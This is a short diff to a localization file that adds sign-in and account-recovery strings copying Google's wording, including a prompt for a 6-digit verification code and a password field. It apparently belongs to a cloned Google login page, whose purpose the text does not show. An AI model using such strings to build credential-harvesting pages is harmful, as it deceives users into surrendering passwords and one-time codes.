@@ -81,6 +81,16 @@
     "sign_in_learn_more": "Learn more",
     "sign_in_create_account": "Create account",
 
+    "password_recovery_heading" : "Account recovery",
+    "password_recovery_subheading" : "To help keep your account safe, Google wants to make sure it’s really you trying to sign in",
+    "password_recovery_note" : "Enter the 6-digit code Google just sent to your email",
+    "password_recovery_form_placeholder": "Enter code",
+
+    "password_heading": "Hi ",
+    "password_form_placeholder": "Enter your password",
+    "password_show": "Show password",
+    "password_forgot" : "Forgot password?",
+
     "next": "Next",
 
     "signpage_footer_help": "Help"
